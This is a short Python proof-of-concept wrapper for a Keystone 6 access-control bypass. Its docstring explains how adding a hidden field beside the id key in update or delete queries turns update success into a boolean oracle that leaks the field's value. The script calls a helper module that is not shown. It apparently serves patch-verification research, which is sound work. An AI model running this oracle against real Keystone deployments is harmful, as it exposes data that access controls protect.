#!/usr/bin/env python3
"""
Original PoC -- CVE-2025-46720 (@keystone-6/core isFilterable bypass in
update/delete via multi-unique `where`).

Given to the method. This is the value-oracle that WORKS on V0 (6.4.0) and is
BLOCKED on V1 (6.5.1). The attacker smuggles the non-filterable, unreadable
`code` field into a WhereUniqueInput alongside a legitimate unique key (`id`);
on the vulnerable version only the first key is access-checked, turning
update success/failure into a boolean value-oracle for `code`.

Usage: original_poc.py <base_url> <flag>
"""
import sys
from oracle import probe_original

if __name__ == "__main__":
    base, flag = sys.argv[1], sys.argv[2]
    verdict, detail = probe_original(base, flag)
    print("[original CVE-2025-46720 update multi-where oracle] verdict=%s" % verdict)
    print(detail)
    sys.exit(0 if verdict == "REACHED" else 1)
